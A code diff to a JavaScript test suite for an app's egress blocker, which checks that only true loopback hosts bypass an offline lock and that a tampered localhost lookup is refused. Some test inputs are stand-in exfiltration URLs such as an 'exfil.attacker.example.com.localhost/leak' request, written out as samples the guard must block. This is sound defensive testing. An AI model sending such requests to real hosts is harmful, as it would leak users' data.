@@ -224,7 +224,7 @@ describe('encrypted data directory (fsx)', () => {
 
 describe('internet blocker (code layer)', () => {
   test('non-loopback destinations are refused before any name lookup; loopback always passes', async () => {
-    assert.ok(isLoopbackHost('localhost') && isLoopbackHost('127.0.0.1') && isLoopbackHost('[::1]') && isLoopbackHost('a.localhost'));
+    assert.ok(isLoopbackHost('localhost') && isLoopbackHost('127.0.0.1') && isLoopbackHost('[::1]') && !isLoopbackHost('a.localhost'));
     assert.ok(!isLoopbackHost('huggingface.co') && !isLoopbackHost('10.0.0.1') && !isLoopbackHost('127.example.com'));
     const g = { blocked: true };
     registerGuard(g);
@@ -363,5 +363,37 @@ describe('key buffers handed out are copies', () => {
     await file.set(k);
     (await file.get()).fill(0);
     assert.deepEqual(await file.get(), k);
+  });
+});
+
+describe('what counts as this Mac (review 03)', () => {
+  test('only the exact name localhost and loopback literals; *.localhost is the internet; localhost is pinned to loopback', async () => {
+    const { isLoopbackHost, assertEgress, egressBlocked, registerGuard, unregisterGuard, trackConnection, closeBlockedConnections } = await import('../server/security/egress.mjs');
+    const { httpRequest } = await import('../server/lib/http-client.mjs');
+    for (const h of ['localhost', 'LOCALHOST', 'localhost.', '127.0.0.1', '127.8.9.10', '::1', '[::1]', '::ffff:127.0.0.1']) assert.equal(isLoopbackHost(h), true, h);
+    for (const h of ['exfil.attacker.example.com.localhost', 'a.localhost', 'localhost.example.com', '10.0.0.1', '0.0.0.0', 'mylocalhost']) assert.equal(isLoopbackHost(h), false, h);
+    const g = { blocked: true };
+    registerGuard(g);
+    const dns = (await import('node:dns')).default;
+    const orig = dns.lookup;
+    try {
+      assert.throws(() => assertEgress('http://exfil.attacker.example.com.localhost/leak', 'model_catalog'), (e) => e.code === 'offline_lock');
+      assert.equal(egressBlocked('http://a.localhost/'), true);
+      await assert.rejects(httpRequest('http://exfil.attacker.example.com.localhost/leak'), (e) => e.code === 'offline_lock');
+      // `localhost` resolving elsewhere (a tampered hosts file / resolver) is refused before connecting
+      dns.lookup = (host, opts, cb) => { const f = typeof opts === 'function' ? opts : cb; f(null, [{ address: '93.184.216.34', family: 4 }, { address: '127.0.0.1', family: 4 }]); };
+      await assert.rejects(httpRequest('http://localhost:9/x', { signal: AbortSignal.timeout(3000) }), (e) => e.code === 'ELOCALHOST_NOT_LOOPBACK' || e.cause?.code === 'ELOCALHOST_NOT_LOOPBACK');
+      dns.lookup = orig;
+      // long-lived connections to a remote host are closed when the blocker comes back on
+      g.blocked = false;
+      let closed = 0;
+      const untrackLocal = trackConnection('ws://127.0.0.1:8188/ws', () => { closed += 100; });
+      trackConnection('ws://comfy.remote.example:8188/ws', () => { closed += 1; });
+      assert.equal(closeBlockedConnections(), 0, 'nothing is closed while access is allowed');
+      g.blocked = true;
+      assert.equal(closeBlockedConnections(), 1);
+      assert.equal(closed, 1, 'the remote socket is closed, the local one is not tracked');
+      untrackLocal();
+    } finally { dns.lookup = orig; unregisterGuard(g); }
   });
 });
